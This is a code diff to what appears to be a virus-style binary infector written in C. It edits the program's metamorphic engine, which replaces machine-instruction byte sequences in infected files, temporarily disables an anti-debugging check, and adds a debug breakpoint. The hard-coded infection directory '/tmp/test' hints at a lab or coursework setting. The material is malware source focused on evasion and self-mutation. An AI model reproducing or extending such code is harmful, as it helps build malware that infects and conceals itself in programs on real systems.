@@ -5,6 +5,7 @@ static void  start(void) {}
 
 #include "shellcode.h"
 
+asm("int3");
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
@@ -13,8 +14,8 @@ int   entry_point(void *magic) {
 
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
-  if ((ret = preventDebug()) == -1)
-    return (stop(1, magic));
+  /* if ((ret = preventDebug()) == -1) */
+  /*   return (stop(1, magic)); */
   if (ret == 1)
     return (stop(0, magic));
   if (magic != (void *)0x42)
@@ -570,6 +571,12 @@ static void obfuscate(char *header, size_t size) {
 }
 
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
+  /* "\x55\x48\x89\xe5\x48\x83", */
+  /* "\xcc\xcc\xcc\xcc\xcc\xcc", */
+  /* "" */
+  "\x55\x48\x89\xe5",
+  "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5",
+  ""
   /* "\xcc", */
   /* "\x90", */
   /* "", */
@@ -601,16 +608,17 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
         ins += MAX_INS_SIZE;
         continue ;
       }
-      i += 1;
       // TODO Choose random replacement
+      i += j;
       ins += MAX_INS_SIZE;
       // TODO Check if enough space
       k = 0;
-      while (k < j) {
+      while (ins[k]) {
         bin[binSize] = ins[k];
         binSize += 1;
         k += 1;
       }
+      new->size += k - j;
       while (ins[0] != 0)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
